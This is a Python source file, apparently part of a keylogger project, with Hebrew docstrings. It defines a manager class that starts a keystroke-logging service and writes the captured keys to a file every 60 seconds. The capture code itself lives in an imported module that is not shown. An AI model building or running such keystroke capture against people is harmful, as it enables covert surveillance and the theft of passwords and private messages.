import threading
from implementation.writers.file_writer import FileWriter
from implementation.loggers.k import KeyLoggerService

class KeyLoggerManager:
    def __init__(self):
        self.logger = KeyLoggerService()
        self.writer = FileWriter()
        self.running = False

    def start(self):
        """מתחיל את תהליך איסוף ההקלדות ושמירתן כל דקה"""
        self.running = True
        self.logger.start_logging()
        self._schedule_saving()

    def stop(self):
        """עוצר את ההקלטה ושומר את הנתונים שנותרו"""
        self.running = False
        self.logger.stop_logging()
        self._save_to_file()

    def _schedule_saving(self):
        """מתזמן את שמירת הנתונים כל 60 שניות"""
        if self.running:
            self._save_to_file()
            threading.Timer(60, self._schedule_saving).start()

    def _save_to_file(self):
        """שומר את הנתונים לקובץ ומנקה את הזיכרון"""
        data = self.logger.get_logged_keys()
        if data:
            self.writer.write_to_file(data)
            self.logger.logged_keys.clear()  # מנקה את ה-Buffer

